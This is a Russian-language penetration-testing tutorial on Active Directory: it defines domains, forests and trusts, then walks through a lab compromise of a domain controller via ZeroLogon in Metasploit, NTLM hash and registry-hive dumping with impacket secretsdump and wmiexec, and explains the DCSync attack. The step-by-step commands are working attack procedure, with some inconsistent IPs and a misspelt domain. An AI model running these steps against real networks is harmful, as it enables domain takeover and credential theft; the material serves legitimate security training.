### Основные понятия

**Каталог (Directory, хранилище данных)** — в контексте компьютерной сети иерархическая структура, хранящая информацию
об
объектах в сети. Объекты включают общие ресурсы, такие, как серверы, общие тома и принтеры; учетные записи пользователей
и компьютеров сети; а также домены, приложения, службы, политики безопасности и почти все остальное в вашей сети.

**Служба каталогов (Directory Service)** — является как источником информации каталога, так и службой, делающей
информацию
доступной и полезной для администраторов, пользователей, сетевых служб и приложений. Active Directory™, служба
каталогов, входящая в состав Microsoft® Windows® 2000, хранит информацию о сетевых объектах, а также реализует службы,
которые делают эту информацию доступной и полезной для пользователей, компьютеров и приложений.

**Объекты (Objects)** — это сущности, составляющие сеть. Объект — это отдельный именованный набор атрибутов,
представляющий
что-то конкретное, например, пользователя, принтер или приложение.

**Схема (Schema)** — это описание классов объектов (различных типов объектов) и атрибутов для этих классов объектов. Для
каждого класса объектов схема определяет атрибуты, которые должен иметь этот класс объектов, дополнительные атрибуты,
которые он может иметь, и класс объектов, который может быть его родителем. Каждый объект Active Directory является
экземпляром класса объекта. Каждый атрибут определяется только один раз и может использоваться в нескольких классах.
Например, атрибут Description определяется один раз, но используется во многих различных классах.

**Домены** — это объекты-контейнеры, набор административно определенных объектов, которые имеют общую базу данных
каталога,
политики безопасности и доверительные отношения с другими доменами. Таким образом, каждый домен является
административной границей для объектов. Один домен может охватывать несколько физических мест или сайтов и содержать
миллионы объектов.

**Дерево домена (Domain Tree)** — состоит из нескольких доменов, которые имеют общую схему и конфигурацию, образуя
непрерывное пространство имен. Домены в дереве также связаны между собой доверительными отношениями. Active Directory
представляет собой набор из одного или нескольких деревьев.

**Лес (Forest)** — это набор из одного или нескольких деревьев доменов, которые не образуют непрерывное пространство
имен.
Все деревья в лесу имеют общую схему, конфигурацию и глобальный каталог. Все деревья в данном лесу обмениваются доверием
в соответствии с транзитивными иерархическими отношениями доверия Kerberos. В отличие от деревьев, лес не требует
отдельного имени. Лес существует как набор объектов перекрестных ссылок и доверительных отношений Kerberos,
распознаваемых входящими в него деревьями. Деревья в лесу образуют иерархию для целей доверия Kerberos; имя дерева в
корне дерева доверия относится к данному лесу.

**Доверительные отношения (Trust Relationship)** — это отношения, установленные между двумя доменами, которые позволяют
пользователям одного домена быть распознанными контроллером домена в другом домене. Доверительные отношения позволяют
пользователям получать доступ к ресурсам в другом домене, а также позволяют администраторам управлять правами
пользователей в другом домене. На уровне леса доверительные отношения создаются автоматически между корневым доменом
леса и корневым доменом каждого дерева доменов, добавленного в лес, в результате чего между всеми доменами в лесу Active
Directory существует полное доверие.

### Разбор базового примера

Вы получили доступ к машине с ОС Windows и обнаружили контроллер домена, и ваша задача — взломать контроллер домена,
извлечь данные объектов домена и закрепить доступ в домене.

Ход действий

1. Проведем сканирование сервера с помощью nmap:

> $ nmap -Pn -n -F -v --open 192.168.0.117

Список портов типичен для контроллера домена: помимо стандартных для Windows портов SMB, MS-RPC и NetBIOS присутствует
также DNS-сервер на порту 53, сервер используемого для авторизации в домене протокола Kerberos на 88 и протокол доступа
к каталогам LDAP на 389.

2. Попробуем определить версию DNS-сервера с помощью сканирования SMB-порта с помощью скриптов nmap:

> $ nmap -Pn -n -p 445 -sV -sC -v --open 192.168.0.117

Данная версия Windows Server, выполняющего роль контроллера домена, может быть подвержена ZeroLogon – опасной
уязвимости, позволяющей злоумышленникам получить полный доступ к контроллеру домена, даже не имея каких-либо учетных
данных.

> $ msfconsole

3. Используем средства Metasploit Framework для проверки сервера на эту уязвимость:

> msf6> search zerologon

> msf6> use auxiliary/admin/dcerpc/cve_2020_1472_zerologon

4. Указываем IP сервера и его NetBIOS имя, ранее полученное при сканировании nmap:

> msf6> set RHOSTS 192.168.0.17

> msf6> set NBNAME DC1

5. Проверим, что хост действительно уязвим:

> msf6> check

6. Произведем эксплуатацию уязвимости:

> msf6> run

Данная техника эксплуатации приводит к установке пустого пароля машинного аккаунта контроллера домена, что может повлечь
нарушение работы домена в целом.

7. Для корректной эксплуатации нам нужно сначала получить учетные данные администратора домена, а затем, используя их,
   восстановить старый пароль машинного аккаунта. Используем для этого impacket — набор инструментов для работы с
   протоколами сетевого и прикладного уровня в Python, позволяющего взаимодействовать с Windows-сетями из Linux и вести
   тестирование их безопасности.

> $ locate impacket

8. Ключевым инструментом на этом шаге будет secretsdump – скрипт, используемый для получения учетных данных с удаленных
   Windows-компьютеров или локальных файлов реестра.

> $ python3 /usr/lib/python3/dist-packages/impacket/examples/secretsdump.py

> $ impacket-secretsdump -h

9. Используем secretsdump для получения NTLM-хэша администратора домена. Ключ -just-dc-user позволяет получить хэш
   нужного нам пользователя, -no-pass указывает на то, что пароль машинного аккаунта пустой, sandbox.local – имя домена,
   DC1$ - имя машинной учетной записи, а IP 192.168.0.117 – адрес контроллера домена.

> $ impacket-secretsdump -no-pass -just-dc-user administrator 'sandox.local/DC1$@192.168.0.117'

10. Для восстановления пароля машинной учетной записи нам необходимо вытащить его из реестра Windows, для чего мы можем
    подключиться к контроллеру домена с помощью инструмента wmiexec, который используется для выполнения команд на
    удаленной системе Windows через WMI (Windows Management Instrumentation).

> $ impacket-wmiexec -h

11. Укажем ранее полученный хэш администратора и проверим права после подключения:

> $ impacket-wmiexec -hashes <hash> 'sandbox.local/administrator@192.168.0.117'

> C:\> whoami

12. Сохраним интересующие нас ветки реестра в отдельные файлы:

> C:\> reg save HKLM\SYSTEM system.save

> C:\> reg save HKLM\SAM sam.save

> C:\> reg save HKLM\SECURITY security.save

13. Скачаем эти файлы на локальную машину:

> C:\> lget system.save

> C:\> lget sam.save

> C:\> lget security.save

И удалим их:

> C:\> del /f system.save security.save sam.save

14. Локально проанализируем эти файлы с помощью impacket-secretsdump:

> $ impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL

15. Теперь, когда мы получили старый пароль машинного аккаунта из секретов LSA, мы можем вновь запустить эксплойт из
    msf, но уже в режиме восстановления пароля:

> $ msfconsole

> msf6> use auxiliary/admin/dcerpc/cve_2020_1472_zerologon

> msf6> set RHOSTS 192.168.0.17

> msf6> set NBNAME DC1

16. Опции при этом останутся прежними, кроме двух новых: ACTION – выбора действия и PASSWORD – значения пароля машинного
    аккаунта в HEX:

> msf6> set ACTION RESTORE

> msf6> set PASSWORD <$MACHINE.ACC hex password>

17. Восстановим пароль:

> msf6> run

18. Убедимся, что доступ сохранился:

> $ impacket-wmiexec -hashes <hash> 'sandbox.local/administrator@192.168.0.117'

### Общие принципы

В общих случаях захватить контроллер домена возможно 3 различными подходами:

- Эксплуатация уязвимости в контроллере домена
- Кража учетных данных, токенов и сессий привилегированных УЗ
- Эксплуатация миссконфигураций сервисов в AD, предоставляющих доступ от имени привилегированных учетных записей

### Захват контроллера домена

У любопытного слушателя могут появиться вопросы:

- Какое поведение можно назвать захватом контроллера домена?
- Почему важно захватить контроллер домена?


В общем случае, назвать захватом домена можно получение уровня доступа управления контроллером домена из под учетной
записи, которая имеет соответствующие права.

По умолчанию наивысшие права в домене имеет учетная запись из группы Enterprise Admins.

**Администраторы предприятия (Enterprise Admins)** — это встроенная группа, находится в контейнере Users корневого домена
леса, которая по умолчанию имеет административный доступ ко всем доменам в лесу. Enterprise Admins представляет полный
доступ к конфигурации всех контроллеров домена. Существует очень мало задач, требующих использования учетной записи
Enterprise Admins.

Есть и другие группы, имеющие наивысшие привилегии в домене после Администраторов Предприятия. Это Администраторы и
Администраторы домена:

**Администраторы (Administrators)** – находится в контейнере Builtin каждого домена. Эта группа имеет полный доступ ко всем
контроллерам домена и данным в контексте именования домена. Она может изменять членство во всех административных группах
домена, а группа Администраторы (Administrators) в корневом домене леса может изменять членство в группах Администраторы
предприятия (Enterprise Admins), Администраторы Схемы (Schema Admins) и Администраторы домена (Domain Admins).

**Администраторы домена (Domain Admins)** – находится в контейнере Users каждого домена. Эта группа входит в группу
Администраторы своего домена. Поэтому она наследует все полномочия группы Администраторы. Кроме того, она по умолчанию
входит в локальную группу Администраторы каждого рядового компьютера домена, в результате чего администраторы домена
получают в свое распоряжение все компьютеры домена.

#### Возможности групп Администраторов

Получив права доступа в одной из этих групп, мы можем управлять конфигурацией Домена или даже Леса. Мы можем получить
доступ или изменить любые данные учетных записей, машин, сервисов и пр. А также управлять любой машиной в домене и любой
учетной записью.

Что еще более интересно, мы можем выгрузить все секреты, ключи, хеши пользователей и пр. учетных записей из контроллера
домена и пользоваться ими для создания токенов доступа или входа в машины.

Для эксплуатации такой возможности зачастую используется утилита SecretsDump.py пакета Impacket, выполняющая атаку под
названием DCSync Attack.

#### DCSync Attack

Разрешение DCSync подразумевает наличие таких разрешений на сам домен: DS-Replication-Get-Changes, Replicating Directory
Changes All и Replicating Directory Changes In Filtered Set.

Важные замечания о DCSync:

- Атака DCSync имитирует поведение контроллера домена и просит другие контроллеры домена реплицировать информацию с
помощью протокола Directory Replication Service Remote Protocol (MS-DRSR). Поскольку MS-DRSR является действительной и
необходимой функцией Active Directory, его нельзя отключить или деактивировать.
- По умолчанию только администраторы домена, администраторы предприятия, администраторы и группы контроллеров домена имеют
необходимые привилегии.

#### SecretsDump

Утилита secretsdump выполняет атаку DCSync Attack и выполняет различные техники для извлечения хэшей с удаленной машины
без выполнения на ней какого-либо агента. Для SAM и LSA Secrets (включая кэшированные учетные данные) утилита пытается
прочитать как можно больше из реестра, затем сохраняем хэши в целевой системе (%SYSTEMROOT%\\\Temp dir) и читает
остальные данные оттуда.

Для NTDS.dit либо:

a. Получает список пользователей домена и получает его хэши и ключи Kerberos, используя вызов [MS-DRDS]
DRSGetNCChanges() , реплицируя только нужные нам атрибуты.

b. Извлеките NTDS.dit через vssadmin, выполненный с помощью smbexec. Он копируется на temp dir и разбирается удаленно.

Пример выполнения команды:

>python3 secretsdump.py test.local/john:password123@10.10.10.1

Файл ntds.dit представляет собой базу данных, в которой хранится информация Active Directory, такая, как сведения о
пользователях, группах и членстве в группах. База также включает хеши паролей для всех пользователей в домене.

Всегда ли нужны права уровня Администратора?

Для достижения “цели” это нужно не всегда.

Зачастую вашей целью тестирования на проникновение будет являться компрометация узла базы данных (Например,
1С-Предприятия) или узла отвечающего за банковские операции (АРМ КБР или Swift), в таком случае, на пути к получению
доступа вам, возможно, не придется захватывать контроллер домена, а достаточно будет, например, захватить управление
группой “Администраторы 1С” и др.

Необходимость захвата КД

Захват контроллера домена может быть целью анализа защищенности по убеждению Заказчика, для демонстрации наивысшего из
возможных ущерба для организации.

В большинстве случаев, реализующих реальные недопустимые события в организации, в захвате контроллера нет необходимости,
если это не событие полного захвата и отказа в обслуживании Домена.

